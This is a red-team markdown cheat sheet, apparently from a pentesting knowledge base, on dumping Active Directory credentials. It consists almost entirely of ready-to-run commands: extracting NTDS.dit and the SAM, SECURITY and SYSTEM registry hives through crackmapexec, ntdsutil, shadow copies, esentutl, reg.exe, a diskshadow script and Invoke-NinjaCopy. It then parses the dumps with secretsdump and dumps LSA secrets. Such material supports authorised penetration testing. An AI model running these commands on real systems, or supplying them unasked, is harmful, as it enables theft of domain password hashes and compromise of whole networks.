<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# AD Credential Dumping
## References

## Overview

To extract NTDS data, you must have both of the following:
* NTDS.dit file
* SYSTEM hive (C:\Windows\System32\SYSTEM)

NTDS is stored by default in either of the following locations:
* `systemroot\NTDS\ntds.dit`
    * `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
* `systemroot\System32\ntds.dit`
	* `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.

However you can change the location to a custom one, you will need to query the registry to get the current location.

## NTDS
### Extraction
#### From a Linux Machine

* <details><summary>crackmapexec (Click to expand)</summary><p>
	* Examples
		* Example 1: Use default `drsuapi` for NTDS dump

				cme smb $DOMAIN_CONTROLLER -u $DOMAIN_ADMIN -p $PASSWORD --ntds
		* Example 2: Specify `drsuapi`

				cme smb $DOMAIN_CONTROLLER -u $DOMAIN_ADMIN -p $PASSWORD --ntds drsuapi
		* Example 3: VSS

				cme smb $DOMAIN_CONTROLLER -u $DOMAIN_ADMIN -p $PASSWORD --ntds vss

#### From a Windows Machine
* <details><summary>ntdsutil.exe (Click to expand)</summary><p>
	* References
		* [https://adsecurity.org/?p=2398#CreateIFM](https://adsecurity.org/?p=2398#CreateIFM)
	* Notes
		* Dump ntds
	* Examples
		* Example 1: One single command

				ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
		* Example 2: Interactive selection

				C:\>ntdsutil
			* Follow-up Commands

					ntdsutil: activate instance ntds
					ntdsutil: ifm
					ifm: create full c:\pentest
					ifm: quit
					ntdsutil: quit
* <details><summary>vshadow (Click to expand)</summary><p>
	* Examples
		1. Create the dump with vssadmin

				vssadmin create shadow /for=C :
		1. Copy the files

				Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
* <details><summary>Esentutl (Click to expand)</summary><p>
	* References
		* [https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/](https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/)
		* [https://twitter.com/bohops/status/1094810861095534592](https://twitter.com/bohops/status/1094810861095534592)
		* [https://twitter.com/egre55/status/985994639202283520](https://twitter.com/egre55/status/985994639202283520)
	* Examples
		* Example 1 - /vss

				esentutl.exe /y /vss c:\windows\NTDS\ntds.dit /d c:\Users\Administrator\Desktop\HIDDEN\ntds.dit
		* Example 2 - /vssrec

				esentutl.exe /y /vssrec c:\windows\NTDS\ntds.dit /d c:\Users\Administrator\Desktop\HIDDEN\ntds.dit
		* Restore NTDS.dit when it appears corrupted

				esentutl /p /o ntds.dit
* <details><summary>Reg.exe (Click to expand)</summary><p>
	* References
		* [https://pure.security/dumping-windows-credentials/](https://pure.security/dumping-windows-credentials/)
	* Examples
		* Example 1

				C:\> reg.exe save hklm\sam c:\temp\sam.save
		* Example 2

				C:\> reg.exe save hklm\security c:\temp\security.save
		* Example 3

				C:\> reg.exe save hklm\system c:\temp\system.save
* <details><summary>Diskshadow.exe (Click to expand)</summary><p>
	* References
		* Bohops - DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction -<br />[https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
	* Notes
		* Exec functions don't require privileged access
	* Example 1 (Bohops Blog)
		1. Dump using LOLBIN

				diskshadow.exe /s c:\test\diskshadow.txt
			* Contents of diskshadow.txt

					set context persistent nowriters
					add volume c: alias someAlias
					create
					expose %someAlias% z:
					exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
					delete shadows volume %someAlias%
					reset
					exit
		1. Collect registry hive

				reg.exe save hklm\system c:\exfil\system.bak
* PowerShell
	* <details><summary>PowerSploit Module (Click to expand)</summary><p>
		* Examples
			* Example 1

					Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit

### NTDS Parsing
#### From a Linux Machine

* Parse SAM Hive
	* <details><summary>impacket's secretsdump.py (Click to expand)</summary><p>

			secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
* Parse NTDS Secrets
	* <details><summary>impacket's secretsdump.py (Click to expand)</summary><p>

			secretsdump.py -ntds ntds.dit -system system.bak LOCAL

#### LSA Secrets Dumping
* <details><summary>crackmapexec ([CrackMapExec Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/CrackMapExec.md)) (Click to expand)</summary><p>
	* `--lsa` flag

			crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --lsa